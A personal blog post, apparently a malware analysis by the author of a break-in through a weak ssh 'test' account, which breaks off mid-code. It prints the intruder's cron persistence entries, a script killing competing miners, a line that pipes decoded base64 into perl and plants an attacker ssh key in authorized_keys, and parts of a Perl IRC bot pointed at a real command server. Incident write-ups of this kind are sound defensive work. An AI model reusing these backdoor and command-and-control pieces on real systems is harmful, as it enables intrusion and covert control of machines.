@@ -1,0 +1,233 @@
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Hacked - Jack of All Trades</title><meta name=description content="I got hacked.
+There are all kinds of fun exploits people use to get into systems they&rsquo;re not supposed to be in. In my case they used ssh. Normally ssh is secure. None of my passwords are brute-forceable. (Yes, you shouldn&rsquo;t have public-facing password ssh&mldr; but that&rsquo;s no fun when you&rsquo;re on someone else&rsquo;s computer and need to get in in a hurry.) But in a moment of weakness I had needed a blank slate to test an environment regression against."><meta name=author content="John Morris"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Jack of All Trades","url":"https:\/\/2e0byo.github.io\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/2e0byo.github.io\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/2e0byo.github.io\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/2e0byo.github.io\/post\/coding\/hacked\/","name":"Hacked"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"John Morris"},"headline":"Hacked","description":"I got hacked.\nThere are all kinds of fun exploits people use to get into systems they\u0026rsquo;re not supposed to be in. In my case they used ssh. Normally ssh is secure. None of my passwords are brute-forceable. (Yes, you shouldn\u0026rsquo;t have public-facing password ssh\u0026hellip; but that\u0026rsquo;s no fun when you\u0026rsquo;re on someone else\u0026rsquo;s computer and need to get in in a hurry.) But in a moment of weakness I had needed a blank slate to test an environment regression against.","inLanguage":"en","wordCount":1836,"datePublished":"2022-11-12T23:56:13","dateModified":"2022-11-12T23:56:13","image":"https:\/\/2e0byo.github.io\/img\/planing.png","keywords":[""],"mainEntityOfPage":"https:\/\/2e0byo.github.io\/post\/coding\/hacked\/","publisher":{"@type":"Organization","name":"https:\/\/2e0byo.github.io\/","logo":{"@type":"ImageObject","url":"https:\/\/2e0byo.github.io\/img\/planing.png","height":60,"width":60}}}</script><meta property="og:title" content="Hacked"><meta property="og:description" content="I got hacked.
+There are all kinds of fun exploits people use to get into systems they&rsquo;re not supposed to be in. In my case they used ssh. Normally ssh is secure. None of my passwords are brute-forceable. (Yes, you shouldn&rsquo;t have public-facing password ssh&mldr; but that&rsquo;s no fun when you&rsquo;re on someone else&rsquo;s computer and need to get in in a hurry.) But in a moment of weakness I had needed a blank slate to test an environment regression against."><meta property="og:image" content="https://2e0byo.github.io/img/planing.png"><meta property="og:url" content="https://2e0byo.github.io/post/coding/hacked/"><meta property="og:type" content="website"><meta property="og:site_name" content="Jack of All Trades"><meta name=twitter:title content="Hacked"><meta name=twitter:description content="I got hacked.
+There are all kinds of fun exploits people use to get into systems they&rsquo;re not supposed to be in. In my case they used ssh. Normally ssh is secure. None of my passwords are …"><meta name=twitter:image content="https://2e0byo.github.io/img/planing.png"><meta name=twitter:card content="summary"><meta name=generator content="Hugo 0.105.0"><link rel=alternate href=https://2e0byo.github.io/index.xml type=application/rss+xml title="Jack of All Trades"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://2e0byo.github.io/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://2e0byo.github.io/css/syntax.css><link rel=stylesheet href=https://2e0byo.github.io/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span></button>
+<a class=navbar-brand href=https://2e0byo.github.io/>Jack of All Trades</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Home href=https://2e0byo.github.io/>Home</a></li><li><a title=search href=https://2e0byo.github.io/search/>search</a></li><li><a title=About href=https://2e0byo.github.io/page/about/>About</a></li><li class=navlinks-container><a class=navlinks-parent>Project by...</a><div class=navlinks-children><a href=https://2e0byo.github.io/categories>Category</a>
+<a href=https://2e0byo.github.io/tags>Tag</a></div></li></ul></div><div class=avatar-container><div class=avatar-img-border><a title="Jack of All Trades" href=https://2e0byo.github.io/><img class=avatar-img src=https://2e0byo.github.io/img/planing.png alt="Jack of All Trades"></a></div></div></div></nav><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>Hacked</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on November 12, 2022
+&nbsp;(Last modified on November 13, 2022)
+&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;John Morris</span></div></div></div></div></div></header><div class=container role=main><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><article role=main class=blog-post><p>I got hacked.</p><p>There are all kinds of fun exploits people use to get into systems they&rsquo;re not
+supposed to be in. In my case they used <code>ssh</code>. Normally <code>ssh</code> is secure. None
+of my passwords are brute-forceable. (Yes, you shouldn&rsquo;t have public-facing
+password ssh&mldr; but that&rsquo;s no fun when you&rsquo;re on someone else&rsquo;s computer and
+need to get in in a hurry.) But in a moment of weakness I had needed a blank
+slate to test an environment regression against. So I did <code>useradd test</code> with
+the password <code>test</code>, and set up a home directory and shell. It was only
+supposed to last ten minutes. I suppose I must have been called away.</p><p>Earlier I came to the computer to find this:</p><p>Well that&rsquo;s not good. What on earth is <code>kswapd0</code> complaining about? There&rsquo;s
+plenty of ram. Must be a pessimal case from a memory leak in the browser;
+although curiously toggling swap (<code>swapoff -a</code> and then <code>swapon -a</code>) didn&rsquo;t seem
+to kill it. But I was in a hurry and doing something else, so I rebooted the
+computer and walked away.</p><p>When I came back, <code>kswapd0</code> was still causing problems. And surely it shouldn&rsquo;t
+run under the user <code>test</code>? I assumed <code>test</code> was a (poorly named) system user,
+but no, <code>su test</code> prompts for a password and <code>sudo su test; cd ~</code> gets me a home
+directory with things I clearly put there, and <code>fish</code> as a shell (which no
+system account would have). Oh, and it&rsquo;s <code>./kswapd0</code>: surely no kernel service
+would use relative paths (or even paths at all?).</p><p>At this point it slowly dawned on me what had happened. I unplugged the
+ethernet cable and went looking: what was happening?</p><h2 id=analysis>Analysis</h2><p>There were two processes running for <code>test</code>: <code>./kswapd0</code> and <code>rsync</code>.
+<code>/proc/N/cmdline</code> gave the expected names, but <code>readlink -f /proc/$RSYNCPID/exe</code>
+was <code>/usr/bin/perl</code>. Oh no. What on earth were they running? Fortunately
+<code>readlink -f /proc/$KSWAPD0PID/exe</code> took me straight to the directory with the
+code in, and it could be copied before killing the processes (which didn&rsquo;t
+endeavour to clean up).</p><p>I didn&rsquo;t delete <code>test</code> just yet. After all, the damage is done, and the
+ethernet is pulled. Rather I went looking inside <code>.configrc</code> (sic!) which
+contained two directories (imaginatively named <code>a</code> and <code>b</code>) and two files:
+<code>crond.d</code> and <code>dir2.dir</code>. <code>dir2.dir</code> just contained the path to its directory,
+but <code>cron.d</code> contained the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1 1 */2 * * /home/test/.configrc/a/upd&gt;/dev/null 2&gt;&amp;1
+</span></span><span class=line><span class=cl>@reboot /home/test/.configrc/a/upd&gt;/dev/null 2&gt;&amp;1
+</span></span><span class=line><span class=cl>5 8 * * 0 /home/test/.configrc/b/sync&gt;/dev/null 2&gt;&amp;1
+</span></span><span class=line><span class=cl>@reboot /home/test/.configrc/b/sync&gt;/dev/null 2&gt;&amp;1  
+</span></span><span class=line><span class=cl>0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1
+</span></span></code></pre></div><p>Ah. The two <code>@reboot</code> lines are what start the code on boot; I didn&rsquo;t even know
+there was such a thing as <code>@reboot</code>. The first line just runs the same code as
+the reboot at 1 minute past 1 am every other day, presumably in case it dies or
+is killed. The third line is the same as the fourth line, but runs weekly. The
+fifth line is more interesting: it calls a file which is clearly created by the
+others every third day at midnight. This file pretends to be aptitude (I run
+arch, so that would have raised eyebrows). It&rsquo;s probably the phone-home code.
+Fortunately it hasn&rsquo;t run, because <code>kswapd0</code> used so much cpu I spotted it
+instantly.</p><h2 id=reverse-engineering>Reverse Engineering</h2><p><code>a/upd</code> contains the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nb>cd</span> /home/test/.configrc/a
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>test</span> -r /home/test/.configrc/a/bash.pid<span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl><span class=nv>pid</span><span class=o>=</span><span class=k>$(</span>cat /home/test/.configrc/a/bash.pid<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>$(</span><span class=nb>kill</span> -CHLD <span class=nv>$pid</span> &gt;/dev/null 2&gt;<span class=p>&amp;</span>1<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=k>then</span>
+</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>./run <span class=p>&amp;</span>&gt;/dev/null
+</span></span></code></pre></div><p>Other than the complete lack of indentation, this is easy: it tries to read the
+current pid from a file and kill the process, and then start it. So now to
+<code>a/run</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>./stop
+</span></span><span class=line><span class=cl><span class=c1>#./init0</span>
+</span></span><span class=line><span class=cl>sleep <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=nb>pwd</span> &gt; dir.dir
+</span></span><span class=line><span class=cl><span class=nv>dir</span><span class=o>=</span><span class=k>$(</span>cat dir.dir<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nv>ARCH</span><span class=o>=</span><span class=sb>`</span>uname -m<span class=sb>`</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$ARCH</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;i686&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>		nohup ./anacron &gt;&gt;/dev/null <span class=p>&amp;</span> 
+</span></span><span class=line><span class=cl>	<span class=k>elif</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$ARCH</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;x86_64&#34;</span> <span class=o>]</span><span class=p>;</span>   <span class=k>then</span>
+</span></span><span class=line><span class=cl>		./kswapd0
+</span></span><span class=line><span class=cl>	<span class=k>fi</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=nv>$!</span> &gt; bash.pid
+</span></span></code></pre></div><p>Look at that! Even malicious code ships with commented out lines!</p><p>Here again everything is simple. We try to stop previous instances, sleep for
+a bit to let everything calm down, and then start one of two scripts.
+<code>./anacron</code> (which obviously isn&rsquo;t anacron) wasn&rsquo;t shipped, but we do have
+<code>./kswapd0</code>. Firstly, though, let&rsquo;s look at <code>./stop</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=cp></span>pkill -9 cron
+</span></span><span class=line><span class=cl>killall -9 cron
+</span></span><span class=line><span class=cl><span class=nb>kill</span> -9 <span class=sb>`</span>ps x<span class=p>|</span>grep cron<span class=p>|</span>grep -v grep<span class=p>|</span>awk <span class=s1>&#39;{print $1}&#39;</span><span class=sb>`</span>&gt;.proc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pkill -9 kswapd0
+</span></span><span class=line><span class=cl>killall -9 kswapd0
+</span></span><span class=line><span class=cl><span class=nb>kill</span> -9 <span class=sb>`</span>ps x<span class=p>|</span>grep kswapd0<span class=p>|</span>grep -v grep<span class=p>|</span>awk <span class=s1>&#39;{print $1}&#39;</span><span class=sb>`</span>&gt;.proc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pkill -9 ld-linux
+</span></span><span class=line><span class=cl>killall -9 ld-linux
+</span></span><span class=line><span class=cl><span class=nb>kill</span> -9 <span class=sb>`</span>ps x<span class=p>|</span>grep ld-linux<span class=p>|</span>grep -v grep<span class=p>|</span>awk <span class=s1>&#39;{print $1}&#39;</span><span class=sb>`</span>&gt;.proc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pkill -9 Donald
+</span></span><span class=line><span class=cl>killall -9 Donald
+</span></span><span class=line><span class=cl><span class=nb>kill</span> -9 <span class=sb>`</span>ps x<span class=p>|</span>grep Donald<span class=p>|</span>grep -v grep<span class=p>|</span>awk <span class=s1>&#39;{print $1}&#39;</span><span class=sb>`</span>&gt;.proc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pkill -9 xmr
+</span></span><span class=line><span class=cl>killall -9 xmr
+</span></span><span class=line><span class=cl><span class=nb>kill</span> -9 <span class=sb>`</span>ps x<span class=p>|</span>grep xmr<span class=p>|</span>grep -v grep<span class=p>|</span>awk <span class=s1>&#39;{print $1}&#39;</span><span class=sb>`</span>&gt;.proc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pkill -9 xm64
+</span></span><span class=line><span class=cl>killall -9 xm64
+</span></span><span class=line><span class=cl><span class=nb>kill</span> -9 <span class=sb>`</span>ps x<span class=p>|</span>grep xm64<span class=p>|</span>grep -v grep<span class=p>|</span>awk <span class=s1>&#39;{print $1}&#39;</span><span class=sb>`</span>&gt;.proc
+</span></span><span class=line><span class=cl>rm -rf .proc
+</span></span></code></pre></div><p>Oops. They don&rsquo;t know if we have <code>pkill</code> or <code>killall</code>. So here are three
+redundant copy-pasted ways to kill lets of things. The third line should always
+work, since it only depends on <code>ps</code>, which is POSIX, so the other two are
+pointless. It&rsquo;s rather crude, and written by someone who doesn&rsquo;t like spaces:
+<code>ps x</code> prints the processes, then one <code>grep</code> filters them, another grep (!) filters
+out the first grep instance (which will also match, because <code>|</code> is a <em>stream</em> so
+<code>ps</code> is still running when <code>grep</code> starts its work) and then <code>awk</code> gets the pid.
+This is saved to a file we promptly remove, which is odd enough, but haven&rsquo;t
+they just leaked the names of a bunch of dodgy executables? Including one
+called <code>Donald</code>, which is weird enough. I wonder which Donald that could be?
+Probably Donald Duck.</p><p>Also, DRY, Russian hackers.</p><p><code>file kswapd0</code> tells us it&rsquo;s a binary, so we&rsquo;ll come back to that one.</p><h3 id=obfuscated-italian-perl>&lsquo;Obfuscated&rsquo; Italian Perl</h3><p>Meanwhile, what about <code>b</code>?</p><p><code>b/sync</code>, the entrypoint, contains the following pointless code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nb>cd</span> /home/test/.configrc/b
+</span></span><span class=line><span class=cl>./run
+</span></span></code></pre></div><p>Ah well. I guess this is a kind of security by constant redirect. <code>run</code>
+contains this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=nv>$VeryLongBase64EncodedString</span> <span class=p>|</span> base64 --decode <span class=p>|</span> perl
+</span></span><span class=line><span class=cl><span class=nb>cd</span> ~ <span class=o>&amp;&amp;</span> rm -rf .ssh <span class=o>&amp;&amp;</span> mkdir .ssh <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&#34;</span>&gt;&gt;.ssh/authorized_keys <span class=o>&amp;&amp;</span> chmod -R <span class=nv>go</span><span class=o>=</span> ~/.ssh
+</span></span></code></pre></div><p>Let&rsquo;s hope that&rsquo;s not their only public key :p Charming username, too. Also
+not FQDN, how rude. The very long base64 encoded string decodes to the
+following perl:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=nb>eval</span> <span class=nb>unpack</span> <span class=nv>$VeryLongPerlString</span>
+</span></span></code></pre></div><p>Hmm. No, I don&rsquo;t think I will. What about <code>print</code> for <code>eval</code>?</p><p>And neatly formatted (for once!) indented perl drops out onto the terminal. Oh.
+So after all that effort, in the language which is famous for stupid
+obfuscations, they didn&rsquo;t bother? Nice, I guess.</p><p>Here is some of it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=k>my</span> <span class=nv>$processo</span> <span class=o>=</span> <span class=s>&#39;rsync&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$servidor</span><span class=o>=</span><span class=s>&#39;45.9.148.99&#39;</span> <span class=k>unless</span> <span class=nv>$servidor</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$porta</span><span class=o>=</span><span class=s>&#39;443&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>@canais</span><span class=o>=</span><span class=p>(</span><span class=s>&#34;#007&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>@adms</span><span class=o>=</span><span class=p>(</span><span class=s>&#34;polly&#34;</span><span class=p>,</span><span class=s>&#34;molly&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>@auth</span><span class=o>=</span><span class=p>(</span><span class=s>&#34;localhost&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$linas_max</span><span class=o>=</span><span class=mi>6</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$sleep</span><span class=o>=</span><span class=mi>3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$nick</span> <span class=o>=</span> <span class=n>getnick</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$ircname</span> <span class=o>=</span> <span class=n>getnick</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$realname</span> <span class=o>=</span> <span class=p>(</span><span class=sb>`uname -a`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$acessoshell</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$prefixo</span> <span class=o>=</span> <span class=s>&#34;! &#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$estatisticas</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$pacotes</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$VERSAO</span> <span class=o>=</span> <span class=s>&#39;0.2a&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$SIG</span><span class=p>{</span><span class=s>&#39;INT&#39;</span><span class=p>}</span> <span class=o>=</span> <span class=s>&#39;IGNORE&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$SIG</span><span class=p>{</span><span class=s>&#39;HUP&#39;</span><span class=p>}</span> <span class=o>=</span> <span class=s>&#39;IGNORE&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$SIG</span><span class=p>{</span><span class=s>&#39;TERM&#39;</span><span class=p>}</span> <span class=o>=</span> <span class=s>&#39;IGNORE&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$SIG</span><span class=p>{</span><span class=s>&#39;CHLD&#39;</span><span class=p>}</span> <span class=o>=</span> <span class=s>&#39;IGNORE&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$SIG</span><span class=p>{</span><span class=s>&#39;PS&#39;</span><span class=p>}</span> <span class=o>=</span> <span class=s>&#39;IGNORE&#39;</span><span class=p>;</span>
+</span></span></code></pre></div><p>This is not <em>much</em> better than the obfuscated string before. Really,
+obfuscating perl is a bit of a joke&mdash;it&rsquo;s hard enough to read on a good day.
+But these programmers have gone a step further. They have used <em>portugese</em>.
+Definitely not Russian hackers, then. No russian would write
+<code>die "Problema com o fork: $!" unless defined($pid);</code>.</p><p>What follows is an IRC bot, in a horrible language (perl, not portugese) which
+someone has tried hard to make readable with indentation and all the other
+things we do to make up for a language which thinks <code>@_</code> and <code>$_</code> is decent
+syntax. The chatbot sits there waiting for messages in the IRC chat:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=k>sub</span> <span class=nf>parse</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=k>my</span> <span class=nv>$servarg</span> <span class=o>=</span> <span class=nb>shift</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=p>(</span><span class=nv>$servarg</span> <span class=o>=~</span><span class=sr> /^PING \:(.*)/</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>     <span class=n>sendraw</span><span class=p>(</span><span class=s>&#34;PONG :$1&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=p>}</span> <span class=k>elsif</span> <span class=p>(</span><span class=nv>$servarg</span> <span class=o>=~</span><span class=sr> /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>if</span> <span class=p>(</span><span class=nv>$args</span> <span class=o>=~</span><span class=sr> /^\001VERSION\001$/</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>elsif</span> <span class=p>(</span><span class=nv>$args</span> <span class=o>=~</span><span class=sr> /^\001PING\s+(\d+)\001$/</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>elsif</span> <span class=p>(</span><span class=nb>grep</span> <span class=p>{</span><span class=nv>$_</span> <span class=o>=~</span><span class=sr> /^\Q$pn\E$/i</span> <span class=p>}</span> <span class=nv>@adms</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=nv>$onde</span> <span class=ow>eq</span> <span class=s>&#34;$meunick&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>         <span class=k>elsif</span> <span class=p>(</span><span class=nv>$args</span> <span class=o>=~</span><span class=sr> /^(\Q$meunick\E|\Q$prefixo\E)\s+(.*)/</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$arg</span> <span class=o>=~</span><span class=sr> /^\!(.*)/</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>elsif</span> <span class=p>(</span><span class=nv>$arg</span> <span class=o>=~</span><span class=sr> /^\@(.*)/</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>         <span class=p>}</span>
+</span></span><span class=line><span class=cl>       <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=p>}</span> <span class=k>elsif</span> <span class=p>(</span><span class=nv>$servarg</span> <span class=o>=~</span><span class=sr> /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>if</span> <span class=p>(</span><span class=nb>lc</span><span class=p>(</span><span class=nv>$1</span><span class=p>)</span> <span class=ow>eq</span> <span class=nb>lc</span><span class=p>(</span><span class=nv>$meunick</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=p>}</span> <span class=k>elsif</span> <span class=p>(</span><span class=nv>$servarg</span> <span class=o>=~</span> <span class=sr>m/^\:(.+?)\s+433/i</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=p>}</span> <span class=k>elsif</span> <span class=p>(</span><span class=nv>$servarg</span> <span class=o>=~</span> <span class=sr>m/^\:(.+?)\s+001\s+(\S+)\s/i</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>foreach</span> <span class=k>my</span> <span class=nv>$canal</span> <span class=p>(</span><span class=nv>@canais</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>I&rsquo;ve taken out all the code here, but it&rsquo;s not hard to make sense of: there&rsquo;s
+code to respond to pings, to execute arbitrary shell commands and return, to
+join irc channels, to print the version&mdash;<code>notice("$pn", "\001VERSION mIRC v6.16 ENE ALIN GABRIEL\001");</code> (Does this name mean anything?)&mdash;and to do a bunch of
+other irc admin tasks. There&rsquo;s also code to send debug statistics, although
+it&rsquo;s off by default. But really. Even perl supports better control flow than
+this horrible bunch of nested mess.</p><p>Then we find the following fun function (&lsquo;subroutine&rsquo;):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=k>sub</span> <span class=nf>attacker</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>my</span> <span class=nv>$iaddr</span> <span class=o>=</span> <span class=n>inet_aton</span><span class=p>(</span><span class=nv>$_</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
